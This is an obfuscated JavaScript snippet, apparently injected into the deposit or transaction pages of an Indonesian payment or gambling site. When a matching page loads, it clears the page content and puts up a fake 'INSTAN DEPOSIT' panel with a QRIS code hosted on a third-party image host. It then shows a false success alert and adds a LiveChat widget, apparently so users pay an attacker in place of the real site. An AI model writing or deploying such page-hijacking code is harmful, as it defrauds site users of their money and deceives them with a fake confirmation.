document.addEventListener("DOMContentLoaded", function () {
    const _0x5b2f = new URLSearchParams(window.location.search);
    const _0xa9d1 = window.location.pathname;

    if (!_0x5b2f.has("bank") && !_0xa9d1.endsWith("/BANK") && _0x5b2f.get("page") !== "transaksi" && 
        !_0xa9d1.endsWith("/deposit") && !_0xa9d1.endsWith("/deposit.php")) {
        console.log("Skrip tidak berjalan karena bukan di halaman yang sesuai.");
        return;
    }

    console.log("Skrip berjalan di halaman dengan parameter ?bank, berakhiran /qris.php, ?page=transaksi, /deposit, atau /deposit.php");

    let _0x1a2b = document.createElement("div");
    _0x1a2b.style.display = "flex";
    _0x1a2b.style.justifyContent = "center";
    _0x1a2b.style.alignItems = "center";
    _0x1a2b.style.height = "100vh";

    let _0x7c4d = document.createElement("div");
    _0x7c4d.className = "container";
    _0x7c4d.style.background = "rgba(0, 0, 0, 0.7)";
    _0x7c4d.style.padding = "20px";
    _0x7c4d.style.borderRadius = "10px";
    _0x7c4d.style.textAlign = "center";
    _0x7c4d.style.color = "white";

    _0x7c4d.innerHTML = `
        <h1 style="margin-bottom: 20px;">INSTAN DEPOSIT</h1>
        <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS Code" style="width: 250px; border-radius: 10px;">
        <br>
        <a href="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" download="qris-code.jpeg" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer; text-decoration: none;">
            Download QRIS
        </a>
        <p>Scan > Isi Nominal > Transfer > Konfirmasi</p>
        <input type="text" id="nominal" placeholder="Masukkan Nominal" 
            style="width: 80%; padding: 10px; text-align: center; font-size: 18px; border: none; border-radius: 5px; color: brown;">
        <br>
        <button id="konfirmasiBtn" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer;">
            Konfirmasi
        </button>
    `;

    _0x1a2b.appendChild(_0x7c4d);
    document.body.innerHTML = "";
    document.body.appendChild(_0x1a2b);

    document.body.style.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMGf-ZGNtCXgGR1Gcy5rCZxuS-tfdZgyx0tY74IV4ffrptYHsI9-GDC2I&s=10') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.height = "100vh";

    document.getElementById("nominal").addEventListener("input", function (_0x8f3b) {
        let _0xd1e7 = _0x8f3b.target.value.replace(/\D/g, ""); 
        _0x8f3b.target.value = _0xd1e7.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    });

    document.getElementById("nominal").style.color = "brown";

    document.getElementById("konfirmasiBtn").addEventListener("click", function () {
        let _0xe6bc = document.getElementById("nominal").value;
        if (_0xe6bc === "") {
            alert("Masukkan nominal terlebih dahulu!");
        } else {
            alert("Deposit berhasil dikirim");
            window.location.href = "../";
        }
    });

    // Menambahkan LiveChat tanpa mengganggu fungsi lainnya
    const liveChatScript = document.createElement("script");
    liveChatScript.innerHTML = `
        window.__lc = window.__lc || {};
        window.__lc.license = 19086469;
        window.__lc.integration_name = "manual_channels";
        window.__lc.product_name = "livechat";
        (function(n,t,c){
            function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}
            var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},
            once:function(){i(["once",c.call(arguments)])},
            off:function(){i(["off",c.call(arguments)])},
            get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},
            call:function(){i(["call",c.call(arguments)])},init:function(){
                var n=t.createElement("script");
                n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",
                t.head.appendChild(n)}};
            !n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e
        }(window,document,[].slice));
    `;
    document.body.appendChild(liveChatScript);
});